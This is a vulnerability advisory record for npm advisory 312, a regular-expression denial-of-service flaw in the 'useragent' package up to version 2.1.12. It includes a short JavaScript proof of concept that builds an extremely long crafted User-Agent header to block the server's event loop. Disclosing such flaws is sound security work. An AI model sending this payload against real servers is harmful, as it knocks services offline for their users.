advisory_id: npm-312
datasource_id: nodejs_security_wg/npm-312
datasource_url: https://github.com/nodejs/security-wg/blob/main/vuln/npm/312.json
aliases: []
summary: "ReDoS via long UserAgent header\nUseragent is used to parse useragent headers. It\
  \ uses several regular expressions to accomplish this.\n\nAn attacker could edit their own\
  \ headers, creating an arbitrarily long useragent string, causing the event loop and server\
  \ to block. \n\nProof of Concept:\n```\nvar useragent = require('useragent');\n\nvar badUserAgent\
  \ = 'MSIE 0.0'+Array(900000).join('0')+'XBLWP';\nvar request = 'GET / HTTP/1.1\\r\\nUser-Agent:\
  \ ' + badUserAgent + '\\r\\n\\r\\n';\nconsole.log(useragent.parse(request));\n```"
impacted_packages:
  - purl: pkg:npm/useragent
    affected_versions: vers:npm/<=2.1.12
    fixed_versions: vers:npm/>=2.1.13
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '7.5'
    scoring_system: cvssv3
    scoring_elements: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
    published_at: None
    url: https://github.com/nodejs/security-wg/blob/main/vuln/npm/312.json
weaknesses: []
references:
  - url: https://github.com/nodejs/security-wg/blob/main/vuln/npm/312.json
    reference_type:
    reference_id: 312
